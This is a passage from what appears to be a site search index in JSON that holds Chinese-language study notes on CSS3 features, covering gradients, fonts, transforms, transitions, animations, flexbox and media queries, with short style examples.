\",\"调整形状的半径\",\"CSS3渐变09.png\",\"background-image: radial-gradient(100px,red,yellow,green); \",\"CSS3渐变10.png\",\"background-image: radial-gradient(50px 100px,red,yellow,green); \",\"调整开始渐变的位置\",\"CSS3渐变11.png\",\"background-image: radial-gradient(red 50px,yellow 100px,green 150px); \"]},{\"header\":\"重复渐变\",\"slug\":\"重复渐变\",\"contents\":[\"无论线性渐变，还是径向渐变，在没有发生渐变的位置，继续进行渐变，就为重复渐变\",\"使用 repeating-linear-gradient 进行重复线性渐变，具体参数同 linear-gradient\",\"使用 repeating-radial-gradient 进行重复径向渐变，具体参数同 radial-gradient\"]}]},\"/front-end/css-notes/20-CSS3%E5%AD%97%E4%BD%93.html\":{\"title\":\"CSS3字体\",\"contents\":[{\"header\":\"基本用法\",\"slug\":\"基本用法\",\"contents\":[\"可以通过 @font-face 指定字体的具体地址，浏览器会自动下载该字体，这样就不依赖用户电脑上的字体了\",\"语法（简写方式）：\",\"@font-face { font-family: \\\"情书字体\\\"; src: url('./方正手迹.ttf'); } \",\"语法（高兼容性写法）：\",\"@font-face { font-family: \\\"atguigu\\\"; font-display: swap; src: url('webfont.eot'); /* IE9 */ src: url('webfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */ url('webfont.woff2') format('woff2'), url('webfont.woff') format('woff'), /* chrome、firefox */ url('webfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android*/ url('webfont.svg#webfont') format('svg'); /* iOS 4.1- */ } \"]},{\"header\":\"定制字体\",\"slug\":\"定制字体\",\"contents\":[\"中文的字体文件很大，使用完整的字体文件不现实，通常针对某几个文字进行单独定制\",\"可使用阿里 Web 字体定制工具：iconfont-webfont平台\"]},{\"header\":\"字体图标\",\"slug\":\"字体图标\",\"contents\":[\"字体图标可以为前端工程师提供一种方便高效的图标使用方式，展示的是图标，本质属于字体\",\"字体图标使用场景：主要用于显示网页中通用的、常用的一些小图标\",\"字体图标的优点：\",\"轻量级：一个图标字体要比一系列的图像要小。一旦字体加载了，图标就会马上渲染出来，减少了服务器请求\",\"灵活性：本质其实是文字，可以很随意的改变颜色、产生阴影、透明效果、旋转等\",\"兼容性：几乎支持所有的浏览器，请放心使用\",\"注意： 字体图标不能替代精灵技术，只是对工作中图标部分技术的提升和优化\"]}]},\"/front-end/css-notes/21-CSS3%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2.html\":{\"title\":\"CSS3用户界面\",\"contents\":[{\"header\":\"box-sizing 怪异盒模型\",\"slug\":\"box-sizing-怪异盒模型\",\"contents\":[\"使用 box-sizing 属性可以设置盒模型的两种类型\",\"可选值\",\"含义\",\"content-box\",\"width 和 height 设置的是盒子内容区的大小（默认值）\",\"border-box\",\"width 和 height 设置的是盒子总大小（怪异盒模型）\"]},{\"header\":\"resize 调整尺寸\",\"slug\":\"resize-调整尺寸\",\"contents\":[\"使用 resize 属性可以控制是否允许用户调节元素尺寸\",\"值\",\"含义\",\"none\",\"不允许用户调整元素大小（默认）\",\"both\",\"用户可以调节元素的宽度和高度\",\"horizontal\",\"用户可以调节元素的宽度\",\"vertical\",\"用户可以调节元素的高度\",\"例如实际开发中，我们文本域右下角是不可以拖拽的：\",\" textarea{ resize: none; } \"]}]},\"/front-end/css-notes/22-CSS3%E9%95%BF%E5%BA%A6%E5%92%8C%E9%A2%9C%E8%89%B2.html\":{\"title\":\"CSS3长度和颜色\",\"contents\":[{\"header\":\"CSS3新增长度单位\",\"slug\":\"css3新增长度单位\",\"contents\":[\"rem 根元素字体大小的倍数，只与根元素字体大小有关\",\"vw 视口宽度的百分之多少 10vw 就是视口宽度的 10%\",\"vh 视口高度的百分之多少 10vh 就是视口高度的 10%\",\"vmax 视口宽高中大的那个的百分之多少\",\"vmin 视口宽高中小的那个的百分之多少\"]},{\"header\":\"CSS3新增颜色设置方式\",\"slug\":\"css3新增颜色设置方式\",\"contents\":[\"CSS3 新增了三种颜色设置方式，分别是： rgba 、 hsl 、 hsla，前面颜色部分有详细介绍\"]},{\"header\":\"opacity 不透明度\",\"slug\":\"opacity-不透明度\",\"contents\":[\"opacity 属性能为整个元素添加透明效果，值是 0 到 1 之间的小数， 0 是完全透明， 1 表示完全不透明\",\"opacity 与 rgba 的区别：\",\"opacity 是一个属性，设置的是整个元素（包括元素里的内容）的不透明度\",\"rgba 是颜色的设置方式，用于设置颜色，它的透明度，仅仅是调整颜色的透明度\"]}]},\"/front-end/css-notes/23-CSS3%E6%BB%A4%E9%95%9C.html\":{\"title\":\"CSS3滤镜\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"filter CSS 属性将模糊或颜色偏移等图形效果应用于元素\",\"语法：\",\"filter:函数(); \",\"例如：\",\"filter: blur(5px);/* blur模糊处理,数值越大越模糊 */ \"]}]},\"/front-end/css-notes/24-CSS3calc%E5%87%BD%E6%95%B0.html\":{\"title\":\"CSS3calc函数\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"calc() 此 CSS 函数让你在声明 CSS 属性值时执行一些计算\",\"语法：\",\"width: calc(100% - 80px); \",\"括号里面可以使用 + - *  / 来进行计算\"]}]},\"/front-end/css-notes/25-CSS3%E5%A4%9A%E5%88%97%E5%B8%83%E5%B1%80.html\":{\"title\":\"CSS3多列布局\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"作用：专门用于实现类似于报纸的布局\",\"常用属性如下：\",\"column-count ：指定列数，值是数字\",\"column-width ：指定列宽，值是长度\",\"columns ：同时指定列宽和列数，复合属性；值没有数量和顺序要求\",\"column-gap ：设置列边距，值是长度\",\"column-rule-style ：设置列与列之间边框的风格，值与 border-style 一致\",\"column-rule-width ：设置列与列之间边框的宽度，值是长度\",\"column-rule-color ：设置列与列之间边框的颜色\",\"coumn-rule ：设置列边框，复合属性\",\"column-span 指定是否跨列；值: none 、 all\"]}]},\"/front-end/css-notes/26-CSS3%E5%9B%BE%E5%BD%A2%E5%8F%98%E6%8D%A2.html\":{\"title\":\"CSS3图形变换\",\"contents\":[{\"header\":\"2D变换\",\"slug\":\"_2d变换\",\"contents\":[\"二维坐标系如图：\",\"CSS3图形变换01.png\"]},{\"header\":\"2D位移\",\"slug\":\"_2d位移\",\"contents\":[\"2D 位移可以改变元素的位置，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值，相关可选值如下： \",\"translateX：设置水平方向位移，需指定长度值；若指定的是百分比，是参考自身宽度的百分比\",\"translateY：设置垂直方向位移，需指定长度值；若指定的是百分比，是参考自身高度的百分比\",\"translate：一个值代表水平方向，两个值代表水平和垂直方向\",\"注意点： \",\"位移与相对定位很相似，都不脱离文档流，不会影响到其它元素\",\"与相对定位的区别：相对定位的百分比值，参考的是其父元素；定位的百分比值，参考的是其自身\",\"浏览器针对位移有优化，与定位相比，浏览器处理位移的效率更高\",\"transform 可以链式编写，例如：transform: translateX(30px) translateY(40px);\",\"位移对行内元素无效\",\"位移配合定位，可实现元素水平垂直居中，如：.box { position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); }\"]},{\"header\":\"2D缩放\",\"slug\":\"_2d缩放\",\"contents\":[\"2D 缩放是指：让元素放大或缩小，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值，相关可选值如下： \",\"scaleX：设置水平方向的缩放比例，值为一个数字， 1 表示不缩放，大于 1 放大，小于 1 缩小\",\"scaleY：设置垂直方向的缩放比例，值为一个数字， 1 表示不缩放，大于 1 放大，小于 1 缩小\",\"scale：同时设置水平方向、垂直方向的缩放比例，一个值代表同时设置水平和垂直缩放；两个值分别代表：水平缩放、垂直缩放\",\"注意点： \",\"scale 的值，是支持写负数的，但几乎不用，因为容易让人产生误解\",\"借助缩放，可实现小于 12px 的文字\"]},{\"header\":\"2D旋转\",\"slug\":\"_2d旋转\",\"contents\":[\"2D 旋转是指：让元素在二维平面内，顺时针旋转或逆时针旋转，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值，相关可选值如下： \",\"rotate：设置旋转角度，需指定一个角度值 ( deg )，正值顺时针，负值逆时针\",\"注意： rotateZ(20deg) 相当于 rotate(20deg) ，当然到了 3D 变换的时候，还能写： rotate(x,x,x)\"]},{\"header\":\"2D扭曲\",\"slug\":\"_2d扭曲\",\"contents\":[\"2D 扭曲是指：让元素在二维平面内被“拉扯”，进而“走形”，实际开发几乎不用，了解即可，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值，相关可选值如下： \",\"skewX：设置元素在水平方向扭曲，值为角度值，会将元素的左上角、右下角拉扯\",\"skewY：设置元素在垂直方向扭曲，值为角度值，会将元素的左上角、右下角拉扯\",\"skew：一个值代表 skewX ，两个值分别代表： skewX 、 skewY\"]},{\"header\":\"多重变换\",\"slug\":\"多重变换\",\"contents\":[\"多个变换，可以同时使用一个 transform 来编写\",\"transform: translate(-50%, -50%) rotate(45deg); \"]},{\"header\":\"变换原点\",\"slug\":\"变换原点\",\"contents\":[\"元素变换时，默认的原点是元素的中心，使用 transform-origin 可以设置变换的原点\",\"修改变换原点对位移没有影响，对旋转和缩放会产生影响\",\"如果提供两个值，第一个用于横坐标，第二个用于纵坐标\",\"如果只提供一个，若是像素值，表示横坐标，纵坐标取 50% ；若是关键词，则另一个坐标取 50%\",\"/* 变换原点在元素的中心位置，百分比是相对于自身。—— 默认值 */ transform-origin: 50% 50%; /* 变换原点在元素的左上角 */ transform-origin: left top; /* 变换原点距离元素左上角 50px 50px 的位置 */ transform-origin: 50px 50px; /* 只写一个值的时候，第二个值默认为 50% */ transform-origin: 0; \"]},{\"header\":\"3D变换\",\"slug\":\"_3d变换\",\"contents\":[]},{\"header\":\"开启3D空间\",\"slug\":\"开启3d空间\",\"contents\":[\"重要原则：元素进行 3D 变换的首要操作：父元素必须开启 3D 空间！\",\"使用 transform-style 开启 3D 空间，可选值如下：\",\"flat ： 让子元素位于此元素的二维平面内（ 2D 空间）—— 默认值\",\"preserve-3d ： 让子元素位于此元素的三维空间内（ 3D 空间）\"]},{\"header\":\"设置景深\",\"slug\":\"设置景深\",\"contents\":[\"何为景深？—— 指定观察者与 z=0 平面的距离，能让发生 3D 变换的元素，产生透视效果，看来更加立体\",\"使用 perspective 设置景深，可选值如下：\",\"none ： 不指定透视 ——（默认值）\",\"长度值 ： 指定观察者距离 z=0 平面的距离，不允许负值\",\"注意： perspective 设置给发生 3D 变换元素的父元素！\"]},{\"header\":\"透视点位置\",\"slug\":\"透视点位置\",\"contents\":[\"所谓透视点位置，就是观察者位置；默认的透视点在元素的中心\",\"使用 perspective-origin 设置观察者位置（透视点的位置）\",\"/* 相对坐标轴往右偏移400px，往下偏移300px（相当于人蹲下300像素，然后向右移动400像素看元素） */ perspective-origin: 400px 300px; \",\"注意：通常情况下，我们不需要调整透视点位置\"]},{\"header\":\"3D位移\",\"slug\":\"_3d位移\",\"contents\":[\"3D 位移是在 2D 位移的基础上，可以让元素沿 z 轴位移，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值， 3D 相关可选值如下： \",\"translateZ：设置 z 轴位移，需指定长度值，正值向屏幕外，负值向屏幕里，且不能写百分比\",\"translate3d：第1个参数对应 x 轴，第2个参数对应 y 轴，第3个参数对应 z 轴，且均不能省略\"]},{\"header\":\"3D旋转\",\"slug\":\"_3d旋转\",\"contents\":[\"3D 旋转是在 2D 旋转的基础上，可以让元素沿 x 轴和 y 轴旋转，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值， 3D 相关可选值如下： \",\"rotateX：设置 x 轴旋转角度，需指定一个角度值 ( deg )，面对 x 轴正方向：正值顺时针，负值逆时针\",\"rotateY：设置 y 轴旋转角度，需指定一个角度值 ( deg )，面对 y 轴正方向：正值顺时针，负值逆时针\",\"rotate3d：前 3 个参数分别表示坐标轴： x , y , z ，第 4 个参数表示旋转的角度，参数不允许省略。例如：transform: rotate3d (1,1,1,30deg) ，意思是： x 、 y 、 z 分别旋转 30 度\"]},{\"header\":\"3D缩放\",\"slug\":\"_3d缩放\",\"contents\":[\"3D 缩放是在 2D 缩放的基础上，可以让元素沿 z 轴缩放，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值， 3D 相关可选值如下： \",\"scaleZ：设置 z 轴方向的缩放比例，值为一个数字， 1 表示不缩放，大于 1 放大，小于 1 缩小\",\"scale3d：第1个参数对应 x 轴，第2个参数对应 y 轴，第3个参数对应 z 轴，参数不允许省略\"]},{\"header\":\"多重变换\",\"slug\":\"多重变换-1\",\"contents\":[\"多个变换，可以同时使用一个 transform 来编写\",\"transform: translateZ(100px) scaleZ(3) rotateY(40deg); \",\"注意点：多重变换时，建议最后旋转\"]},{\"header\":\"背部可见性\",\"slug\":\"背部可见性\",\"contents\":[\"使用 backface-visibility 指定元素背面，在面向用户时是否可见，常用值如下：\",\"visible：指定元素背面可见，允许显示正面的镜像。—— 默认值\",\"hidden：指定元素背面不可见\",\"注意： backface-visibility 需要加在发生 3D 变换元素的自身上\"]}]},\"/front-end/css-notes/27-CSS3%E8%BF%87%E6%B8%A1%E4%B8%8E%E5%8A%A8%E7%94%BB.html\":{\"title\":\"CSS3过渡与动画\",\"contents\":[{\"header\":\"过渡\",\"slug\":\"过渡\",\"contents\":[\"过渡可以在不使用 Flash 动画，不使用 JavaScript 的情况下，让元素从一种样式平滑过渡为另一种样式\"]},{\"header\":\"transition-property\",\"slug\":\"transition-property\",\"contents\":[\"作用：定义哪个属性需要过渡，只有在该属性中定义的属性（比如宽、高、颜色等）才会以有过渡效果\",\"常用值：\",\"none ：不过渡任何属性\",\"all ：过渡所有能过渡的属性\",\"具体某个属性名，例如： width 、 heigth ，若有多个以逗号分隔\",\"不是所有的属性都能过渡，值为数字，或者值能转为数字的属性，都支持过渡，否则不支持过渡。常见的支持过渡的属性有：颜色、长度值、百分比、 z-index 、 opacity 、 2D 变换属性、 3D 变换属性、阴影\"]},{\"header\":\"transition-duration\",\"slug\":\"transition-duration\",\"contents\":[\"作用：设置过渡的持续时间，即：一个状态过渡到另外一个状态耗时多久\",\"常用值：\",\"0 ：没有任何过渡时间 —— 默认值\",\"s 或 ms ：秒或毫秒\",\"列表 ： \",\"如果想让所有属性都持续一个时间，那就写一个值\",\"如果想让每个属性持续不同的时间那就写一个时间的列表\"]},{\"header\":\"transition-delay\",\"slug\":\"transition-delay\",\"contents\":[\"作用：指定开始过渡的延迟时间，单位： s 或 ms\"]},{\"header\":\"transition-timing-function\",\"slug\":\"transition-timing-function\",\"contents\":[\"作用：设置过渡的类型\",\"常用值：\",\"ease ： 平滑过渡 —— 默认值\",\"linear ： 线性过渡\",\"ease-in ： 慢 → 快\",\"ease-out ： 快 → 慢\",\"ease-in-out ： 慢 → 快 → 慢\",\"step-start ： 等同于 steps (1, start)\",\"step-end ： 等同于 steps (1, end)\",\"steps( integer,?) ： 接受两个参数的步进函数。第一个参数必须为正整数，指定函数的步数。第二个参数取值可以是 start 或 end ，指定每一步的值发生变化的时间点。第二个参数默认值为 end\",\"cubic-bezie ( number, number, number, number)： 特定的贝塞尔曲线类型\",\"在线制作贝塞尔曲线： cubic-bezier✿\"]},{\"header\":\"transition 复合属性\",\"slug\":\"transition-复合属性\",\"contents\":[\"如果设置了一个时间，表示 duration ；如果设置了两个时间，第一是 duration ，第二个是 delay ；其他值没有顺序要求\",\"transition:1s 1s linear all; \"]},{\"header\":\"动画\",\"slug\":\"动画\",\"contents\":[]},{\"header\":\"什么是帧\",\"slug\":\"什么是帧\",\"contents\":[\"一段动画，就是一段时间内连续播放 n 个画面。每一张画面，我们管它叫做“帧”。一定时间内连续快速播放若干个帧，就成了人眼中所看到的动画。同样时间内，播放的帧数越多，画面看起来越流畅\"]},{\"header\":\"什么是关键帧\",\"slug\":\"什么是关键帧\",\"contents\":[\"关键帧指的是，在构成一段动画的若干帧中，起到决定性作用的 2-3 帧\"]},{\"header\":\"动画的基本使用\",\"slug\":\"动画的基本使用\",\"contents\":[\"第一步：定义关键帧（定义动画）\",\"简单定义方式：\",\"/*写法一*/ @keyframes 动画名 { from { /*property1:value1*/ /*property2:value2*/ } to { /*property1:value1*/ } } \",\"完整定义方式：\",\"@keyframes 动画名 { 0% { /*property1:value1*/ } 20% { /*property1:value1*/ } 40% { /*property1:value1*/ } 60% { /*property1:value1*/ } 80% { /*property1:value1*/ } 100% { /*property1:value1*/ } } \",\"第二步：给元素应用动画，用到的属性如下：\",\"animation-name ：给元素指定具体的动画（具体的关键帧）\",\"animation-duration ：设置动画所需时间\",\"animation-delay ：设置动画延迟\",\".box { /* 指定动画 */ animation-name: testKey; /* 设置动画所需时间 */ animation-duration: 5s; /* 设置动画延迟 */ animation-delay: 0.5s; } \"]},{\"header\":\"动画的其他属性\",\"slug\":\"动画的其他属性\",\"contents\":[\"animation-timing-function ，设置动画的类型，常用值如下：\",\"ease ： 平滑动画 —— 默认值\",\"linear ： 线性过渡\",\"ease-in ： 慢 → 快\",\"ease-out ： 快 → 慢\",\"ease-in-out ： 慢 → 快 → 慢\",\"step-start ： 等同于 steps (1, start)\",\"step-end ： 等同于 steps(1, end)\",\"steps( integer,?) ： 接受两个参数的步进函数。第一个参数必须为正整数，指定函数的步数。第二个参数取值可以是 start 或 end ，指定每一步的值发生变化的时间点。第二个参数默认值为 end\",\"cubic-bezie ( number, number, number, number)： 特定的贝塞尔曲线类型\",\"animation-iteration-count ，指定动画的播放次数，常用值如下：\",\"number ：动画循环次数\",\"infinite ： 无限循环\",\"animation-direction ，指定动画方向，常用值如下：\",\"normal ： 正常方向 (默认)\",\"reverse ： 反方向运行\",\"alternate ： 动画先正常运行再反方向运行，并持续交替运行\",\"alternate-reverse ： 动画先反运行再正方向运行，并持续交替运行\",\"animation-fill-mode ，设置动画之外的状态，常用值如下：\",\"forwards ： 设置对象状态为动画结束时的状态\",\"backwards ： 设置对象状态为动画开始时的状态\",\"animation-play-state ，设置动画的播放状态，常用值如下：\",\"running ： 运动 (默认)\",\"paused ： 暂停\"]},{\"header\":\"动画复合属性\",\"slug\":\"动画复合属性\",\"contents\":[\"只设置一个时间表示 duration ，设置两个时间分别是： duration 和 delay ，其他属性没有数量和顺序要求\",\".inner { animation: atguigu 3s 0.5s linear 2 alternate-reverse forwards; } \",\"备注： animation-play-state 一般单独使用\"]}]},\"/front-end/css-notes/28-CSS3%E4%BC%B8%E7%BC%A9%E7%9B%92%E6%A8%A1%E5%9E%8B.html\":{\"title\":\"CSS3伸缩盒模型\",\"contents\":[{\"header\":\"伸缩盒模型\",\"slug\":\"伸缩盒模型\",\"contents\":[\"2009 年， W3C 提出了一种新的盒子模型 —— Flexible Box （伸缩盒模型，又称：弹性盒子）\",\"它可以轻松的控制：元素分布方式、元素对齐方式、元素视觉顺序 .......\",\"截止目前，除了在部分 IE 浏览器不支持，其他浏览器均已全部支持\",\"伸缩盒模型的出现，逐渐演变出了一套新的布局方案 —— flex 布局\",\"小贴士：\",\"传统布局是指：基于传统盒状模型，主要靠： display 属性 + position 属性 + float 属性\",\"flex 布局目前在移动端应用比较广泛，因为传统布局不能很好的呈现在移动设备上\"]},{\"header\":\"伸缩容器、伸缩项目\",\"slug\":\"伸缩容器、伸缩项目\",\"contents\":[\"伸缩容器：开启了 flex 的元素，就是伸缩容器 \",\"给元素设置： display: flex 或 display: inline-flex ，该元素就变为了伸缩容器\",\"display: inline-flex 很少使用，因为可以给多个伸缩容器的父容器，也设置为伸缩容器\",\"一个元素可以同时是：伸缩容器、伸缩项目\",\"伸缩项目：伸缩容器所有子元素自动成为了伸缩项目 \",\"仅伸缩容器的子元素成为了伸缩项目，孙子元素、重孙子元素等后代，不是伸缩项目\",\"无论原来是哪种元素（块、行内块、行内），一旦成为了伸缩项目，全都会“块状化”\"]},{\"header\":\"主轴与侧轴\",\"slug\":\"主轴与侧轴\",\"contents\":[\"主轴： 伸缩项目沿着主轴排列，主轴默认是水平的，默认方向是：从左到右（左边是起点，右边是终点）\",\"侧轴： 与主轴垂直的就是侧轴，侧轴默认是垂直的，默认方向是：从上到下（上边是起点，下边是终点）\"]},{\"header\":\"主轴方向\",\"slug\":\"主轴方向\",\"contents\":[\"属性名：flex-direction\",\"常用值如下：\",\"row ：主轴方向水平从左到右 —— 默认值\",\"row-reverse ：主轴方向水平从右到左\",\"column ：主轴方向垂直从上到下\",\"column-reverse ：主轴方向垂直从下到上\",\"CSS3伸缩盒模型01.png\",\"注意：改变了主轴的方向，侧轴方向也随之改变\"]},{\"header\":\"主轴换行方式\",\"slug\":\"主轴换行方式\",\"contents\":[\"属性名：flex-wrap\",\"常用值如下：\",\"nowrap ：默认值，不换行\",\"CSS3伸缩盒模型02.png\",\"wrap ：自动换行，伸缩容器不够自动换行\",\"CSS3伸缩盒模型03.png\",\"wrap-reverse ：反向换行\",\"CSS3伸缩盒模型04.png\"]},{\"header\":\"flex-flow\",\"slug\":\"flex-flow\",\"contents\":[\"flex-flow 是一个复合属性，复合了 flex-direction 和 flex-wrap 两个属性。值没有顺序要求\",\"flex-flow: row wrap; \"]},{\"header\":\"主轴对齐方式\",\"slug\":\"主轴对齐方式\",\"contents\":[\"属性名：justify-content\",\"常用值如下：\",\"flex-start ：主轴起点对齐。—— 默认值\",\"flex-end ：主轴终点对齐\",\"center ：居中对齐\",\"space-between ：均匀分布，两端对齐（最常用）\",\"space-around ：均匀分布，两端距离是中间距离的一半\",\"space-evenly ：均匀分布，两端距离与中间距离一致\",\"CSS3伸缩盒模型05.png\"]},{\"header\":\"侧轴对齐方式\",\"slug\":\"侧轴对齐方式\",\"contents\":[]},{\"header\":\"一行的情况\",\"slug\":\"一行的情况\",\"contents\":[\"所需属性： align-items\",\"常用值如下：\",\"flex-start ：侧轴的起点对齐\",\"flex-end ：侧轴的终点对齐\",\"center ：侧轴的中点对齐\",\"baseline : 伸缩项目的第一行文字的基线对齐\",\"stretch ：如果伸缩项目未设置高度，将占满整个容器的高度。—— （默认值）\",\"CSS3伸缩盒模型06.png\"]},{\"header\":\"多行的情况\",\"slug\":\"多行的情况\",\"contents\":[\"所需属性： align-content\",\"常用值如下：\",\"flex-start ：与侧轴的起点对齐\",\"flex-end ：与侧轴的终点对齐\",\"center ：与侧轴的中点对齐\",\"space-between ：与侧轴两端对齐，中间平均分布\",\"space-around ：伸缩项目间的距离相等，比距边缘大一倍\",\"space-evenly : 在侧轴上完全平分\",\"stretch ：占满整个侧轴。—— 默认值\",\"CSS3伸缩盒模型07.png\"]},{\"header\":\"flex 实现水平垂直居中\",\"slug\":\"flex-实现水平垂直居中\",\"contents\":[\"方法一：父容器开启 flex 布局，随后使用 justify-content 和 align-items 实现水平垂直居中\",\".outer { width: 400px; height: 400px; background-color: #888; display: flex; justify-content: center; align-items: center; } .inner { width: 100px; height: 100px; background-color: orange; } \",\"方法二：父容器开启 flex 布局，随后子元素 margin: auto\",\".outer { width: 400px; height: 400px; background-color: #888; display: flex; } .inner { width: 100px; height: 100px; background-color: orange; margin: auto; } \"]},{\"header\":\"伸缩性\",\"slug\":\"伸缩性\",\"contents\":[]},{\"header\":\"flex-basis\",\"slug\":\"flex-basis\",\"contents\":[\"概念： flex-basis 设置的是主轴方向的基准长度，会让宽度或高度失效\",\"备注：主轴横向：宽度失效；主轴纵向：高度失效\",\"作用：浏览器根据这个属性设置的值，计算主轴上是否有多余空间，默认值 auto ，即：伸缩项目的宽或高\"]},{\"header\":\"flex-grow（伸）\",\"slug\":\"flex-grow-伸\",\"contents\":[\"概念： flex-grow 定义伸缩项目的放大比例，默认为 0 ，即：纵使主轴存在剩余空间，也不拉伸 （放大）\",\"规则：\",\"若所有伸缩项目的 flex-grow 值都为 1 ，则：它们将等分剩余空间（如果有空间的话）\",\"若三个伸缩项目的 flex-grow 值分别为： 1 、 2 、 3 ，则：分别瓜分到： 1/6 、 2/6 、 3/6 的空间\"]},{\"header\":\"flex-shrink（缩）\",\"slug\":\"flex-shrink-缩\",\"contents\":[\"概念： flex-shrink 定义了项目的压缩比例，默认为 1 ，即：如果空间不足，该项目将会缩小\",\"收缩项目的计算，略微复杂一点，我们拿一个场景举例：\",\"例如： 三个收缩项目，宽度分别为： 200px 、 300px 、 200px ，它们的 flex-shrink 值分别为： 1 、 2 、 3\",\"若想刚好容纳下三个项目，需要总宽度为 700px ，但目前容器只有 400px ，还差 300px 所以每个人都要收缩一下才可以放下，具体收缩的值，这样计算：\",\"计算分母： (200×1) + (300×2) + (200×3) = 1400\",\"计算比例： \",\"项目一： (200×1) / 1400 = 比例值1\",\"项目二： (300×2) / 1400 = 比例值2\",\"项目三： (200×3) / 1400 = 比例值3\",\"计算最终收缩大小： \",\"项目一需要收缩： 比例值1 × 300\",\"项目二需要收缩： 比例值2 × 300\",\"项目三需要收缩： 比例值3 × 300\"]},{\"header\":\"flex 复合属性\",\"slug\":\"flex-复合属性\",\"contents\":[\"flex 是复合属性，复合了： flex-grow 、 flex-shrink 、 flex-basis 三个属性，默认值为 0 1 auto\",\"如果写 flex:1 1 auto ，则可简写为： flex:auto\",\"如果写 flex: 1 1 0 ，则可简写为： flex: 1\",\"如果写 flex: 0 0 auto ，则可简写为： flex: none\",\"如果写 flex: 0 1 auto ，则可简写为： flex: 0 auto —— 即 flex 初始值\"]},{\"header\":\"项目排序\",\"slug\":\"项目排序\",\"contents\":[\"order 属性定义项目的排列顺序。数值越小，排列越靠前，默认为 0\"]},{\"header\":\"单独对齐\",\"slug\":\"单独对齐\",\"contents\":[\"通过 align-self 属性，可以单独调整某个伸缩项目的对齐方式\",\"默认值为 auto ，表示继承父元素的 align-items 属性\"]}]},\"/front-end/css-notes/29-CSS3%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80.html\":{\"title\":\"CSS3响应式布局\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"响应式布局指的是同一页面在不同屏幕尺寸下有不同的布局\"]},{\"header\":\"媒体查询\",\"slug\":\"媒体查询\",\"contents\":[]},{\"header\":\"媒体类型\",\"slug\":\"媒体类型\",\"contents\":[\"值\",\"含义\",\"all\",\"检测所有设备\",\"screen\",\"检测电子屏幕，包括：电脑屏幕、平板屏幕、手机屏幕等\",\"print\",\"检测打印机\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> <style> h1 { width: 600px; height: 400px; line-height: 400px; background-image: linear-gradient(30deg, red, yellow, green); margin: 0 auto; text-align: center; font-size: 100px; color: white; text-shadow: 0 0 10px black; } /* 只有在打印机或打印预览才应用的样式 */ @media print { h1 { background: transparent; } } </style> </head> <body> <h1>新年快乐</h1> </body> </html> \"]},{\"header\":\"媒体特性\",\"slug\":\"媒体特性\",\"contents\":[\"值\",\"含义\",\"width\",\"检测视口宽度\",\"max-width\",\"检测视口最大宽度\",\"min-width\",\"检测视口最小宽度\",\"height\",\"检测视口高度\",\"max-height\",\"检测视口最大高度\",\"min-height\",\"检测视口最小高度\",\"device-width\",\"检测设备屏幕的宽度\",\"max-device-width\",\"检测设备屏幕的最大宽度\",\"min-device-width\",\"检测设备屏幕的最小宽度\",\"orientation\",\"检测视口的旋转方向（是否横屏） 1. portrait ：视口处于纵向，即高度大于等于宽度2. landscape ：视口处于横向，即宽度大于高度\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> <style> * { margin: 0; padding: 0; } h1 { height: 200px; background-color: gray; text-align: center; line-height: 200px; font-size: 100px; } /* 检测到视口的宽度为800px时*/ @media (width: 800px) { h1 { background-color: green; } } /* 检测到视口的宽度小于等于700px时*/ @media (max-width: 700px) { h1 { background-color: orange; } } /* 检测到视口的宽度大于等于900px时*/ @media (min-width: 900px) { h1 { background-color: deepskyblue; } } </style> </head> <body> <h1>你好啊</h1> </body> </html> \"]},{\"header\":\"运算符\",\"slug\":\"运算符\",\"contents\":[\"值\",\"含义\",\"and\",\"并且\",\", 或 or\",\"或\",\"not\",\"否定\",\"only\",\"肯定\"]},{\"header\":\"常用阈值\",\"slug\":\"常用阈值\",\"contents\":[\"在实际开发中，会将屏幕划分成几个区间，例如：\",\"CSS3响应式布局01.png\"]}]},\"/front-end/css-notes/30-CSS3BFC.html\":{\"title\":\"CSS3BFC\",\"contents\":[{\"header\":\"什么是BFC\",\"slug\":\"什么是bfc\",\"contents\":[\"W3C 上对 BFC 的定义： 原文：Floats, absolutely positioned elements, block containers (such as inline-blocks, table-cells, and table-captions) that are not block boxes, and block boxes with 'overflow' other than 'visible' (except when that value has been propagated to the viewport) establish new block formatting contexts for their contents. 译文：浮动、绝对定位元素、不是块盒子的块容器（如 inline-blocks 、 table-cells 和 table-captions ），以及 overflow 属性的值除 visible 以外的块盒，将为其内容建立新的块格式化上下文\",\"MDN 上对 BFC 的描述： 块格式化上下文（Block Formatting Context，BFC） 是 Web 页面的可视 CSS 渲染的一部分，是块盒子的布局过程发生的区域，也是浮动元素与其他元素交互的区域\",\"更加通俗的描述：\",\"BFC 是 Block Formatting Context （块级格式上下文），可以理解成元素的一个 “特异功能”\",\"该 “特异功能”，在默认的情况下处于关闭状态；当元素满足了某些条件后，该“特异功能”被激活\",\"所谓激活“特异功能”，专业点说就是：该元素创建了 BFC （又称：开启了 BFC 